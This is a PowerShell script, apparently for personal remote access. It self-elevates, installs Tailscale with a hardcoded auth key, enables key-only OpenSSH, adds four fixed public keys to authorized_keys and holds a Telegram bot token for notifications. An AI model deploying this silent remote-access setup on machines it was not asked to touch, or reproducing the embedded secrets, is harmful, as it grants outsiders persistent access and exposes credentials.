param(
    [string]$RelaunchWorkingDirectory,
    [switch]$LibraryOnly,
    [switch]$NoPause
)

if (-not $LibraryOnly -and -not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $scriptPath = $PSCommandPath
    if (-not $scriptPath) { $scriptPath = $MyInvocation.MyCommand.Definition }

    $psExe = (Get-Process -Id $PID).Path
    if (-not $psExe) { $psExe = 'powershell.exe' }

    $quote = { param($v) '"' + ($v -replace '"', '\"') + '"' }

    $workDir = if ($PWD.Path) { $PWD.Path } else { '' }
    $relaunchArgs = @(
        '-NoProfile', '-ExecutionPolicy', 'Bypass',
        '-File', (& $quote $scriptPath),
        '-RelaunchWorkingDirectory', (& $quote $workDir)
    )
    if ($NoPause) { $relaunchArgs += '-NoPause' }

    try {
        $elevated = Start-Process -FilePath $psExe -ArgumentList $relaunchArgs `
            -Verb RunAs -Wait -PassThru
        $code = if ($null -ne $elevated.ExitCode) { $elevated.ExitCode } else { 0 }
        exit $code
    } catch {
        Write-Host '[ERROR] Administrator privileges required; elevation was cancelled or blocked.' -ForegroundColor Red
        exit 1
    }
}

if ($RelaunchWorkingDirectory -and (Test-Path -LiteralPath $RelaunchWorkingDirectory -PathType Container)) {
    Set-Location -LiteralPath $RelaunchWorkingDirectory
}

$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'

try {
    $OutputEncoding = [System.Text.Encoding]::UTF8
    [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
    if (Get-Command chcp -ErrorAction SilentlyContinue) { chcp 65001 > $null 2>&1 }
} catch {}

$TsAuthKey = 'tskey-auth-kiLmAL1dzY11CNTRL-8kBw3rQUum5U8wepNaB6n5KzhgmcHBmkK'
$SshPort = 22
$script:PreviousSshPort = $null
$SshPublicKeys = @(
    'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHCru1fsEf+V1Dp6etLeB28qkMLDdd/CO2cdYN2takSB YLX-mac',
    'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINnCe0w8jneYzlCU3ozapFNqQX138WaNau22kuhd6wA+ STAR-WSL',
    'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMzwgRkJoTEEh9W8phrGviHsQgWOAFvemnK+gwfqhiN7 yello-PS',
    'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC8taPYDu192wIWnToykJX4lSYVdNNnEe/a970qxauvU lighthouse-linux'
)
$TgBotToken = '8853032121:AAG0nq0plcOl6oVDRTAzgzAGI3QjlIXv9qI'
$TgChatId   = '7765138435'

$script:ManagedUserBlockBegin = '# BEGIN YLX CURRENT USER AUTHORIZED_KEYS'
$script:ManagedUserBlockEnd   = '# END YLX CURRENT USER AUTHORIZED_KEYS'

$FailedSteps = New-Object System.Collections.Generic.List[string]

function Write-Log  { param($m) Write-Host "[*] $m" -ForegroundColor Cyan }
function Write-Warn { param($m) Write-Host "[!] $m" -ForegroundColor Yellow }
function Write-Err  { param($m) Write-Host "[ERROR] $m" -ForegroundColor Red }

function Wait-BeforeExit {
    Write-Host ''
    try {
        [void](Read-Host 'Press Enter to close this window')
    } catch {
        # A redirected/non-interactive host may not support Read-Host.
    }
}

function Assert-NativeCommandSucceeded {
    param([string]$Operation)
    if ($global:LASTEXITCODE -ne 0) {
        throw "$Operation failed (exit=$global:LASTEXITCODE)"
    }
}

function Invoke-RequiredStep {
    param(
        [string]$Desc,
        [scriptblock]$Action
    )
    try {
        $global:LASTEXITCODE = 0
        & $Action | Out-Null
        if ($global:LASTEXITCODE -ne 0) {
            throw "exit=$global:LASTEXITCODE"
        }
    } catch {
        $FailedSteps.Add("$Desc ($($_.Exception.Message))")
        throw
    }
}

function Test-CommandExists {
    param([string]$Name)
    return [bool](Get-Command $Name -ErrorAction SilentlyContinue)
}

function Update-ProcessPath {
    $machine = [Environment]::GetEnvironmentVariable('Path', 'Machine')
    $user    = [Environment]::GetEnvironmentVariable('Path', 'User')
    $env:Path = (@($machine, $user) | Where-Object { $_ }) -join ';'
    $tsDir = Join-Path $env:ProgramFiles 'Tailscale'
    if ((Test-Path $tsDir) -and ($env:Path -notlike "*$tsDir*")) {
        $env:Path = "$env:Path;$tsDir"
    }
}

function Get-TailscaleExe {
    $cmd = Get-Command tailscale -ErrorAction SilentlyContinue
    if ($cmd) { return $cmd.Source }
    $candidate = Join-Path $env:ProgramFiles 'Tailscale\tailscale.exe'
    if (Test-Path $candidate) { return $candidate }
    return $null
}

function Send-Telegram {
    param(
        [hashtable]$Config,
        [string]$Text
    )
    if (-not $Config) { return $false }
    try {
        $uri = "https://api.telegram.org/bot$($Config.Token)/sendMessage"
        $body = @{
            chat_id                  = $Config.ChatId
            text                     = $Text
            disable_web_page_preview = $true
        }
        Invoke-RestMethod -Uri $uri -Method Post -Body $body -TimeoutSec 15 | Out-Null
        return $true
    } catch {
        return $false
    }
}

function Get-PublicIp {
    try {
        $ip = (Invoke-RestMethod -Uri 'https://api.ipify.org' -TimeoutSec 8).ToString().Trim()
        if ($ip -match '^(?:\d{1,3}\.){3}\d{1,3}$') { return $ip }
    } catch {}
    return $null
}

function Get-TailscaleMsiArchitecture {
    switch ($env:PROCESSOR_ARCHITECTURE) {
        'AMD64' { return 'amd64' }
        'ARM64' { return 'arm64' }
        'x86'   { return 'x86' }
        default { return 'amd64' }
    }
}

function Install-TailscaleStandalone {
    # The .exe bundle is Inno Setup based and ignores /quiet, which would leave an
    # interactive installer blocking Start-Process -Wait forever. Use the MSI.
    $arch = Get-TailscaleMsiArchitecture
    $installer = Join-Path $env:TEMP "tailscale-setup-latest-$arch.msi"
    $msiLog = Join-Path $env:TEMP "tailscale-msi-install-$arch.log"
    Write-Log "Downloading the official Tailscale MSI ($arch)..."
    try {
        Invoke-WebRequest -Uri "https://pkgs.tailscale.com/stable/tailscale-setup-latest-$arch.msi" `
            -OutFile $installer -UseBasicParsing
        $process = Start-Process -FilePath 'msiexec.exe' -Wait -PassThru -ArgumentList @(
            '/i', ('"' + $installer + '"'),
            '/quiet', '/norestart',
            '/l*v', ('"' + $msiLog + '"')
        )
        # 3010 is success with a pending reboot; Tailscale is usable without it.
        if ($process.ExitCode -notin @(0, 3010)) {
            throw "Tailscale MSI installer exited with code $($process.ExitCode) (log: $msiLog)"
        }
    } catch {
        Write-Err "Tailscale installer download/run failed: $($_.Exception.Message)"
        throw
    } finally {
        Remove-Item -LiteralPath $installer -Force -ErrorAction SilentlyContinue
    }
}

function Install-Tailscale {
    $global:LASTEXITCODE = 0
    Update-ProcessPath
    if (Get-TailscaleExe) {
        Write-Log 'Tailscale already installed, skipping'
        return
    }

    if (Test-CommandExists 'winget') {
        Write-Log 'Installing Tailscale via winget...'
        winget install --id Tailscale.Tailscale -e --silent `
            --accept-source-agreements --accept-package-agreements
        $wingetExit = $global:LASTEXITCODE
        if ($wingetExit -ne 0) {
            $unsignedExit = [BitConverter]::ToUInt32([BitConverter]::GetBytes([int32]$wingetExit), 0)
            $wingetHex = '0x{0:X8}' -f $unsignedExit
            Write-Warn "winget install failed (exit=$wingetExit, $wingetHex); falling back to the official installer."
            $global:LASTEXITCODE = 0
            Install-TailscaleStandalone
        }
    } else {
        Write-Log 'winget unavailable; using the official installer.'
        Install-TailscaleStandalone
    }
    $global:LASTEXITCODE = 0
    Update-ProcessPath
    if (-not (Get-TailscaleExe)) {
        throw 'Tailscale installer completed, but tailscale.exe was not found'
    }
}

function Wait-ServiceRegistered {
    param([string]$Name, [int]$Attempts = 30, [int]$DelaySeconds = 2)

    # An installer can return before the Service Control Manager has the service,
    # so wait for registration instead of failing on the first lookup.
    for ($attempt = 1; $attempt -le $Attempts; $attempt++) {
        $svc = Get-Service -Name $Name -ErrorAction SilentlyContinue
        if ($svc) { return $svc }
        if ($attempt -lt $Attempts -and $DelaySeconds -gt 0) {
            Start-Sleep -Seconds $DelaySeconds
        }
    }
    throw "Windows service '$Name' was not registered in time"
}

function Enable-TailscaleService {
    $svc = Wait-ServiceRegistered -Name Tailscale
    Set-Service -Name Tailscale -StartupType Automatic -ErrorAction Stop
    if ($svc.Status -ne 'Running') {
        Start-Service -Name Tailscale -ErrorAction Stop
    }
}

function Connect-Tailscale {
    param([string]$AuthKey)
    if (-not $AuthKey) {
        Write-Err 'No Tailscale auth key found. Set the $TsAuthKey variable at the top of the script.'
        throw 'missing-authkey'
    }
    $ts = Get-TailscaleExe
    if (-not $ts) { Write-Err 'tailscale.exe not found'; throw 'tailscale-not-found' }

    $status = & $ts status --json 2>$null
    if ($LASTEXITCODE -eq 0) {
        try {
            if ((($status | ConvertFrom-Json).BackendState) -eq 'Running') {
                Write-Log 'Tailscale is already connected, skipping login'
                return
            }
        } catch {}
    }
    Write-Log 'Logging in to Tailscale (auth key read, not echoed)...'

    & $ts up --reset --authkey $AuthKey --unattended
    Assert-NativeCommandSucceeded 'tailscale up'
}

function Test-TailscaleIPv4 {
    param([string]$Address)
    $parsed = $null
    if (-not [Net.IPAddress]::TryParse($Address, [ref]$parsed)) { return $false }
    $bytes = $parsed.GetAddressBytes()
    return $bytes.Length -eq 4 -and $bytes[0] -eq 100 -and $bytes[1] -ge 64 -and $bytes[1] -le 127
}

function Assert-TailscaleReady {
    param([int]$Attempts = 15, [int]$DelaySeconds = 2)

    $ts = Get-TailscaleExe
    if (-not $ts) { throw 'tailscale.exe not found' }
    $lastState = 'unknown'

    for ($attempt = 1; $attempt -le $Attempts; $attempt++) {
        $statusJson = & $ts status --json 2>$null
        if ($LASTEXITCODE -eq 0 -and $statusJson) {
            try {
                $status = $statusJson | ConvertFrom-Json
                $lastState = [string]$status.BackendState
                $ip = [string](& $ts ip -4 2>$null | Select-Object -First 1)
                $ip = $ip.Trim()
                if ($LASTEXITCODE -eq 0 -and $lastState -eq 'Running' -and (Test-TailscaleIPv4 $ip)) {
                    return $ip
                }
            } catch {
                $lastState = "invalid status JSON: $($_.Exception.Message)"
            }
        }
        if ($attempt -lt $Attempts -and $DelaySeconds -gt 0) {
            Start-Sleep -Seconds $DelaySeconds
        }
    }
    throw "Tailscale did not become ready (BackendState=$lastState, no valid 100.64.0.0/10 IPv4 address)"
}

function Get-TcpPortListenerState {
    param([int]$Port)

    $listeners = @(Get-NetTCPConnection -State Listen -ErrorAction Stop | Where-Object LocalPort -eq $Port)
    if ($listeners.Count -eq 0) { return 'Free' }

    # A single port can be held by several listeners (IPv4 + IPv6, or unrelated
    # processes). Only report Sshd when every identifiable owner is sshd.
    $owners = @($listeners | ForEach-Object OwningProcess | Sort-Object -Unique)
    $identified = 0
    foreach ($owner in $owners) {
        $process = Get-Process -Id $owner -ErrorAction SilentlyContinue
        if (-not $process) { continue }
        $identified++
        if ($process.ProcessName -ine 'sshd') { return 'Other' }
    }
    if ($identified -eq 0) { return 'Other' }
    return 'Sshd'
}

function Wait-TcpPortListenerState {
    param(
        [int]$Port,
        [string[]]$DesiredStates,
        [int]$Attempts = 15,
        [int]$DelaySeconds = 1
    )

    $state = 'unknown'
    for ($attempt = 1; $attempt -le $Attempts; $attempt++) {
        $state = Get-TcpPortListenerState -Port $Port
        if ($state -in $DesiredStates) { return $state }
        if ($attempt -lt $Attempts -and $DelaySeconds -gt 0) {
            Start-Sleep -Seconds $DelaySeconds
        }
    }
    return $state
}

function Assert-SshdHealthy {
    param([int]$Port, [int]$Attempts = 15, [int]$DelaySeconds = 1)

    # A service reporting Running can still be a moment away from binding its
    # listening socket, so poll instead of sampling once.
    $state = Wait-TcpPortListenerState -Port $Port -DesiredStates @('Sshd') `
        -Attempts $Attempts -DelaySeconds $DelaySeconds
    if ($state -ne 'Sshd') {
        throw "sshd is not listening on TCP port $Port (last observed state: $state)"
    }
    if ($Port -eq 22 -and $script:PreviousSshPort -eq 222) {
        $previousState = Wait-TcpPortListenerState -Port 222 -DesiredStates @('Free', 'Other') `
            -Attempts $Attempts -DelaySeconds $DelaySeconds
        if ($previousState -eq 'Sshd') {
            throw 'sshd is still listening on the previous TCP port 222 after migration to TCP 22'
        }
    }
}

function Select-SshPort {
    $primaryState = Get-TcpPortListenerState -Port 22
    if ($primaryState -in @('Free', 'Sshd')) {
        $script:SshPort = 22
        if ($primaryState -eq 'Free') {
            if ((Get-TcpPortListenerState -Port 222) -eq 'Sshd') {
                $script:PreviousSshPort = 222
                Write-Log 'TCP port 22 is available; migrating SSH from TCP 222 to TCP 22'
            } else {
                Write-Log "TCP port 22 is available; configuring SSH on port $script:SshPort"
            }
        } else {
            Write-Log "TCP port 22 is already used by sshd; keeping SSH on port $script:SshPort"
        }
        return
    }

    $fallbackState = Get-TcpPortListenerState -Port 222
    if ($fallbackState -in @('Free', 'Sshd')) {
        $script:SshPort = 222
        if ($fallbackState -eq 'Free') {
            Write-Warn "TCP port 22 is in use by another process; configuring SSH on port $script:SshPort"
        } else {
            Write-Log "TCP port 222 is already used by sshd; keeping SSH on port $script:SshPort"
        }
        return
    }

    throw 'TCP ports 22 and 222 are both in use; cannot configure SSH'
}

function Write-SshdConfigLines {
    param([string]$File, [string[]]$Lines)
    $utf8NoBom = New-Object System.Text.UTF8Encoding($false)
    [IO.File]::WriteAllLines($File, $Lines, $utf8NoBom)
}

function Set-CurrentUserAuthorizedKeysMatch {
    param([string]$File, [string]$UserName)

    if (-not (Test-Path -LiteralPath $File -PathType Leaf)) { throw "sshd_config not found: $File" }
    if ([string]::IsNullOrWhiteSpace($UserName) -or $UserName -match '[\x00-\x1f"]') {
        throw 'current Windows username cannot be represented safely in sshd_config'
    }

    $begin = $script:ManagedUserBlockBegin
    $end = $script:ManagedUserBlockEnd
    $kept = New-Object System.Collections.Generic.List[string]
    $inside = $false
    foreach ($line in [IO.File]::ReadAllLines($File)) {
        if ($line -eq $begin) {
            if ($inside) { throw 'nested managed current-user Match block' }
            $inside = $true
            continue
        }
        if ($line -eq $end) {
            if (-not $inside) { throw 'orphaned managed current-user Match end marker' }
            $inside = $false
            continue
        }
        if (-not $inside) { $kept.Add($line) }
    }
    if ($inside) { throw 'unterminated managed current-user Match block' }

    $block = @(
        $begin,
        ('Match User "{0}"' -f $UserName),
        '    AuthorizedKeysFile .ssh/authorized_keys',
        $end
    )
    $keptLines = @($kept)
    $matchIndex = -1
    for ($i = 0; $i -lt $keptLines.Count; $i++) {
        if ($keptLines[$i] -match '^\s*Match(?:\s|$)') { $matchIndex = $i; break }
    }
    if ($matchIndex -lt 0) {
        $result = $keptLines + $block
    } else {
        $before = if ($matchIndex -gt 0) { @($keptLines[0..($matchIndex - 1)]) } else { @() }
        $after = @($keptLines[$matchIndex..($keptLines.Count - 1)])
        $result = $before + $block + $after
    }
    Write-SshdConfigLines -File $File -Lines $result
}

function Initialize-SshdConfig {
    param([string]$ConfigPath, [string]$TemplatePath)

    if (Test-Path -LiteralPath $ConfigPath -PathType Leaf) { return }
    if (-not (Test-Path -LiteralPath $TemplatePath -PathType Leaf)) {
        throw "OpenSSH default configuration template not found: $TemplatePath"
    }

    $configDirectory = Split-Path -Parent $ConfigPath
    New-Item -ItemType Directory -Path $configDirectory -Force -ErrorAction Stop | Out-Null
    Copy-Item -LiteralPath $TemplatePath -Destination $ConfigPath -ErrorAction Stop
    if (-not (Test-Path -LiteralPath $ConfigPath -PathType Leaf)) {
        throw "failed to create sshd_config from default template: $ConfigPath"
    }
    Write-Log "Created missing sshd_config from OpenSSH default template"
}

function Initialize-SshHostKeys {
    # sshd -t refuses to validate a config when no host key is readable, and on a
    # fresh install the keys only appear once the service has started. Generate the
    # missing ones up front; ssh-keygen -A is idempotent.
    $sshDir = Join-Path $env:ProgramData 'ssh'
    if (Test-Path -LiteralPath $sshDir -PathType Container) {
        $keys = @(Get-ChildItem -LiteralPath $sshDir -Filter 'ssh_host_*_key' -ErrorAction SilentlyContinue)
        if ($keys.Count -gt 0) { return }
    }

    $keygen = Get-Command ssh-keygen.exe -ErrorAction SilentlyContinue
    if (-not $keygen) {
        $candidate = Join-Path $env:WINDIR 'System32\OpenSSH\ssh-keygen.exe'
        if (Test-Path -LiteralPath $candidate) {
            $keygen = [pscustomobject]@{ Source = $candidate }
        }
    }
    if (-not $keygen) {
        Write-Warn 'ssh-keygen.exe not found; leaving host key generation to the sshd service.'
        return
    }

    Write-Log 'Generating missing OpenSSH host keys...'
    & $keygen.Source -A | Out-Null
    Assert-NativeCommandSucceeded 'ssh-keygen -A host key generation'
}

function Assert-SshdConfigValid {
    $sshd = Get-SshdExe
    if (-not $sshd) {
        Write-Warn 'sshd.exe not found; unable to validate sshd_config before restart.'
        return
    }
    & $sshd -t 2>$null
    if ($LASTEXITCODE -ne 0) { throw "sshd config validation failed (exit=$LASTEXITCODE)" }
}

function Enable-OpenSSHServer {
    $cap = Get-WindowsCapability -Online -Name 'OpenSSH.Server*' -ErrorAction Stop
    if ($cap -and $cap.State -ne 'Installed') {
        Write-Log 'Installing OpenSSH Server...'
        Add-WindowsCapability -Online -Name 'OpenSSH.Server~~~~0.0.1.0' -ErrorAction Stop | Out-Null
    } else {
        Write-Log 'OpenSSH Server already installed, skipping'
    }

    $cfg = Join-Path $env:ProgramData 'ssh\sshd_config'
    $defaultCfg = Join-Path $env:WINDIR 'System32\OpenSSH\sshd_config_default'
    Initialize-SshdConfig -ConfigPath $cfg -TemplatePath $defaultCfg
    Select-SshPort
    Set-SshdOption -File $cfg -Key 'Port' -Value $SshPort
    Set-SshdOption -File $cfg -Key 'PasswordAuthentication' -Value 'no'
    Set-SshdOption -File $cfg -Key 'KbdInteractiveAuthentication' -Value 'no'
    # Set explicitly: with password and keyboard-interactive off, an inherited
    # PubkeyAuthentication no would leave no usable authentication method at all.
    Set-SshdOption -File $cfg -Key 'PubkeyAuthentication' -Value 'yes'
    Set-CurrentUserAuthorizedKeysMatch -File $cfg -UserName $env:USERNAME

    Initialize-SshHostKeys
    Assert-SshdConfigValid

    $sshdService = Wait-ServiceRegistered -Name sshd
    Set-Service -Name sshd -StartupType Automatic -ErrorAction Stop
    if ($sshdService.Status -eq 'Running') {
        Restart-Service -Name sshd -ErrorAction Stop
    } else {
        Start-Service -Name sshd -ErrorAction Stop
    }
    Assert-SshdHealthy -Port $SshPort

    try {
        if (Get-Service -Name ssh-agent -ErrorAction SilentlyContinue) {
            Set-Service -Name ssh-agent -StartupType Automatic -ErrorAction Stop
        }
    } catch {
        Write-Warn "Optional ssh-agent configuration failed: $($_.Exception.Message)"
    }

    $ruleName = 'OpenSSH-Server-In-TCP'
    $rule = Get-NetFirewallRule -Name $ruleName -ErrorAction SilentlyContinue
    if ($rule) {
        Remove-NetFirewallRule -Name $ruleName -ErrorAction Stop
    }
    Write-Log "Creating inbound firewall rule (TCP $SshPort)..."
    New-NetFirewallRule -Name $ruleName -DisplayName 'OpenSSH Server (sshd)' `
        -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort $SshPort `
        -Profile Any -RemoteAddress '100.64.0.0/10' | Out-Null
}

function Set-SshdOption {
    param([string]$File, [string]$Key, [string]$Value)
    if (-not (Test-Path -LiteralPath $File -PathType Leaf)) {
        throw "sshd_config not found, refusing to skip option '$Key': $File"
    }
    $lines = @([IO.File]::ReadAllLines($File))
    $pattern = "^\s*$([regex]::Escape($Key))\s+"
    $found = $false
    $out = foreach ($l in $lines) {
        # The managed current-user block is a boundary too: anything emitted after
        # its marker would be swallowed by the next Set-CurrentUserAuthorizedKeysMatch.
        if (($l -match '^\s*Match(?:\s|$)') -or ($l -eq $script:ManagedUserBlockBegin)) {
            if (-not $found) { $found = $true; "$Key $Value" }
        }
        if ($l -match $pattern) {
            # Keep exactly one authoritative global line; drop every other copy,
            # including per-Match copies that would otherwise shadow it.
            if (-not $found) { $found = $true; "$Key $Value" }
            continue
        }
        $l
    }
    if (-not $found) { $out = @($out) + "$Key $Value" }
    Write-SshdConfigLines -File $File -Lines @($out)
}

function Set-AuthorizedKeys {
    if (-not $SshPublicKeys -or $SshPublicKeys.Count -eq 0) {
        throw '$SshPublicKeys is empty; refusing to disable password authentication without a public key'
    }

    $authDir = Join-Path $env:USERPROFILE '.ssh'
    $authFile = Join-Path $authDir 'authorized_keys'
    $userSid = ([Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
    if (-not (Test-Path -LiteralPath $authDir -PathType Container)) {
        New-Item -ItemType Directory -Path $authDir -Force | Out-Null
    }

    if (-not (Test-Path $authFile)) { New-Item -ItemType File -Path $authFile -Force | Out-Null }

    $existing = @(Get-Content -LiteralPath $authFile -ErrorAction SilentlyContinue)
    $added = 0
    foreach ($raw in $SshPublicKeys) {
        $line = $raw.Trim()
        if (-not $line -or $line.StartsWith('#')) { continue }
        if ($existing -contains $line) { continue }
        $existing += $line
        $added++
    }
    Set-Content -LiteralPath $authFile -Value $existing -Encoding ASCII -ErrorAction Stop

    & icacls.exe $authDir /reset | Out-Null
    Assert-NativeCommandSucceeded 'icacls reset current-user .ssh directory'
    & icacls.exe $authDir '/inheritance:r' | Out-Null
    Assert-NativeCommandSucceeded 'icacls disable current-user .ssh inheritance'
    & icacls.exe $authDir /grant:r "*$($userSid):(OI)(CI)(F)" '*S-1-5-18:(OI)(CI)(F)' | Out-Null
    Assert-NativeCommandSucceeded 'icacls grant current user and SYSTEM on .ssh directory'
    & icacls.exe $authDir /setowner "*$userSid" | Out-Null
    Assert-NativeCommandSucceeded 'icacls set current-user .ssh owner'

    & icacls.exe $authFile /reset | Out-Null
    Assert-NativeCommandSucceeded 'icacls reset current-user authorized_keys'
    & icacls.exe $authFile '/inheritance:r' | Out-Null
    Assert-NativeCommandSucceeded 'icacls disable current-user authorized_keys inheritance'
    & icacls.exe $authFile /grant:r "*$($userSid):(F)" '*S-1-5-18:(F)' | Out-Null
    Assert-NativeCommandSucceeded 'icacls grant current user and SYSTEM on authorized_keys'
    & icacls.exe $authFile /setowner "*$userSid" | Out-Null
    Assert-NativeCommandSucceeded 'icacls set current-user authorized_keys owner'

    Assert-AuthorizedKeysReady -File $authFile -Directory $authDir -UserSid $userSid

    Write-Log "authorized_keys configured ($authFile), $added key(s) added this run."
}

function Assert-RestrictedUserAcl {
    param([string]$Path, [string]$UserSid)

    $acl = Get-Acl -LiteralPath $Path -ErrorAction Stop
    if (-not $acl.AreAccessRulesProtected) { throw "ACL inheritance is still enabled: $Path" }
    $ownerSid = $acl.GetOwner([Security.Principal.SecurityIdentifier]).Value
    if ($ownerSid -ne $UserSid) { throw "ACL owner is $ownerSid instead of $UserSid`: $Path" }

    $allowed = @($UserSid, 'S-1-5-18')
    $rules = @($acl.GetAccessRules($true, $true, [Security.Principal.SecurityIdentifier]))
    if ($rules.Count -ne 2) { throw "$Path has $($rules.Count) ACL entries; expected exactly 2" }
    foreach ($rule in $rules) {
        $sid = $rule.IdentityReference.Value
        if ($sid -notin $allowed) { throw "unexpected ACL principal on $Path`: $sid" }
        if ($rule.IsInherited) { throw "inherited ACL entry on $Path`: $sid" }
        if ($rule.AccessControlType -ne [Security.AccessControl.AccessControlType]::Allow) {
            throw "non-Allow ACL entry on $Path`: $sid"
        }
        $fullControl = [Security.AccessControl.FileSystemRights]::FullControl
        if (($rule.FileSystemRights -band $fullControl) -ne $fullControl) {
            throw "ACL is not FullControl on $Path`: $sid"
        }
    }
    foreach ($sid in $allowed) {
        if (-not ($rules | Where-Object { $_.IdentityReference.Value -eq $sid })) {
            throw "required ACL principal missing from $Path`: $sid"
        }
    }
}

function Assert-AuthorizedKeysReady {
    param([string]$File, [string]$Directory, [string]$UserSid)

    if (-not (Test-Path -LiteralPath $File -PathType Leaf)) { throw "authorized_keys file not found: $File" }
    $existing = @(Get-Content -LiteralPath $File -ErrorAction Stop)
    foreach ($key in $SshPublicKeys) {
        if ($existing -notcontains $key.Trim()) { throw "configured public key is missing: $(($key -split '\s+')[-1])" }
    }

    if (-not (Test-Path -LiteralPath $Directory -PathType Container)) { throw ".ssh directory not found: $Directory" }
    Assert-RestrictedUserAcl -Path $Directory -UserSid $UserSid
    Assert-RestrictedUserAcl -Path $File -UserSid $UserSid
}

function Enable-X11Forwarding {
    $cfg = Join-Path $env:ProgramData 'ssh\sshd_config'
    if (-not (Test-Path -LiteralPath $cfg)) {
        Write-Warn "$cfg not found (OpenSSH Server may not have started yet), skipping X11 config."
        return
    }
    Write-Log "Enabling X11 forwarding ($cfg)..."
    Set-SshdOption -File $cfg -Key 'X11Forwarding' -Value 'yes'
    Set-SshdOption -File $cfg -Key 'X11UseLocalhost' -Value 'yes'

    Assert-SshdConfigValid
    Restart-Service -Name sshd -ErrorAction Stop
    Assert-SshdHealthy -Port $SshPort

    Write-Warn 'Native Windows has no built-in X server; to display remote GUI windows, install VcXsrv / Xming on the client.'
}

function Get-SshdExe {
    $cmd = Get-Command sshd.exe -ErrorAction SilentlyContinue
    if (-not $cmd) { $cmd = Get-Command sshd -ErrorAction SilentlyContinue }
    if ($cmd) { return $(if ($cmd.Path) { $cmd.Path } else { $cmd.Source }) }
    $candidate = Join-Path $env:WINDIR 'System32\OpenSSH\sshd.exe'
    if (Test-Path -LiteralPath $candidate) { return $candidate }
    return $null
}

function Get-SshdEffectiveValue {
    param([string[]]$Config, [string]$Key)
    foreach ($line in $Config) {
        if ($line -match ("^" + [regex]::Escape($Key) + "\s+(.+)$")) { return $Matches[1].Trim() }
    }
    return $null
}

function Test-UserAuthorizedKeysValue {
    param([string]$Value)
    if ([string]::IsNullOrWhiteSpace($Value)) { return $false }
    $candidate = $Value.Trim()
    if ($candidate -match '^"([^"]+)"$') {
        $candidate = $Matches[1]
    } elseif ($candidate.Contains('"')) {
        return $false
    }
    $actual = $candidate.Replace('\', '/').TrimEnd('/').ToLowerInvariant()
    $expected = @('.ssh/authorized_keys')
    if ($env:USERPROFILE) {
        $userProfile = $env:USERPROFILE.TrimEnd([char[]]@('\', '/'))
        $expected += "$userProfile/.ssh/authorized_keys".Replace('\', '/').ToLowerInvariant()
    }
    return $actual -in $expected
}

function Assert-SshdEffectiveConfig {
    param([int]$Port, [string]$TailscaleIp)

    $sshd = Get-SshdExe
    if (-not $sshd) { throw 'sshd.exe not found' }
    & $sshd -t 2>$null
    Assert-NativeCommandSucceeded 'sshd config validation'

    $context = "user=$env:USERNAME,host=$env:COMPUTERNAME,addr=100.64.0.1,laddr=$TailscaleIp,lport=$Port"
    $effective = @(& $sshd -T -C $context 2>$null)
    Assert-NativeCommandSucceeded 'sshd effective config validation'

    if ((Get-SshdEffectiveValue $effective 'port') -ne [string]$Port) {
        throw "effective sshd port is not $Port"
    }
    if ((Get-SshdEffectiveValue $effective 'passwordauthentication') -ne 'no') {
        throw 'effective PasswordAuthentication is not no'
    }
    if ((Get-SshdEffectiveValue $effective 'kbdinteractiveauthentication') -ne 'no') {
        throw 'effective KbdInteractiveAuthentication is not no'
    }
    if ((Get-SshdEffectiveValue $effective 'pubkeyauthentication') -ne 'yes') {
        throw 'effective PubkeyAuthentication is not yes; no authentication method would remain'
    }
    $keyFile = Get-SshdEffectiveValue $effective 'authorizedkeysfile'
    if (-not (Test-UserAuthorizedKeysValue $keyFile)) {
        throw "effective AuthorizedKeysFile does not use the current user's .ssh/authorized_keys: $keyFile"
    }
}

function Test-TailscaleFirewallRange {
    param([object[]]$RemoteAddresses)
    $normalized = @($RemoteAddresses | ForEach-Object { ([string]$_).Trim().ToLowerInvariant() })
    return $normalized.Count -eq 1 -and $normalized[0] -in @(
        '100.64.0.0/10',
        '100.64.0.0/255.192.0.0'
    )
}

function Assert-SshFirewallReady {
    param([int]$Port)

    $rule = Get-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -ErrorAction Stop
    if ($rule.Enabled -ne 'True' -or $rule.Direction -ne 'Inbound' -or $rule.Action -ne 'Allow') {
        throw 'OpenSSH firewall rule is not an enabled inbound allow rule'
    }
    if ($rule.Profile -ne 'Any' -and [int]$rule.Profile -ne 0) {
        throw "OpenSSH firewall rule does not apply to all profiles: $($rule.Profile)"
    }
    $portFilters = @($rule | Get-NetFirewallPortFilter -ErrorAction Stop)
    if (-not ($portFilters | Where-Object { $_.Protocol -eq 'TCP' -and [string]$_.LocalPort -eq [string]$Port })) {
        throw "OpenSSH firewall rule does not allow TCP port $Port"
    }
    $addressFilters = @($rule | Get-NetFirewallAddressFilter -ErrorAction Stop)
    $remoteAddresses = @($addressFilters | ForEach-Object RemoteAddress)
    if (-not (Test-TailscaleFirewallRange $remoteAddresses)) {
        throw "OpenSSH firewall rule is not limited to 100.64.0.0/10: $($remoteAddresses -join ', ')"
    }
}

function Assert-SshBanner {
    param([string]$Address, [int]$Port, [int]$TimeoutMs = 5000)

    $client = New-Object Net.Sockets.TcpClient
    $stream = $null
    $reader = $null
    $async = $null
    try {
        $async = $client.BeginConnect($Address, $Port, $null, $null)
        if (-not $async.AsyncWaitHandle.WaitOne($TimeoutMs, $false)) {
            throw "SSH connection to $Address`:$Port timed out"
        }
        $client.EndConnect($async)
        $stream = $client.GetStream()
        $stream.ReadTimeout = $TimeoutMs
        $reader = [IO.StreamReader]::new($stream, [Text.Encoding]::ASCII, $false, 1024, $true)
        $banner = $reader.ReadLine()
        if ($banner -notmatch '^SSH-(?:2\.0|1\.99)-') {
            throw "unexpected SSH protocol banner from $Address`:$Port`: $banner"
        }
    } finally {
        if ($reader) { $reader.Dispose() }
        if ($stream) { $stream.Dispose() }
        if ($async -and $async.AsyncWaitHandle) { $async.AsyncWaitHandle.Close() }
        $client.Dispose()
    }
}

function Assert-SshServerReady {
    param([int]$Port, [string]$TailscaleIp)

    Assert-SshdEffectiveConfig -Port $Port -TailscaleIp $TailscaleIp
    $authDir = Join-Path $env:USERPROFILE '.ssh'
    $authFile = Join-Path $authDir 'authorized_keys'
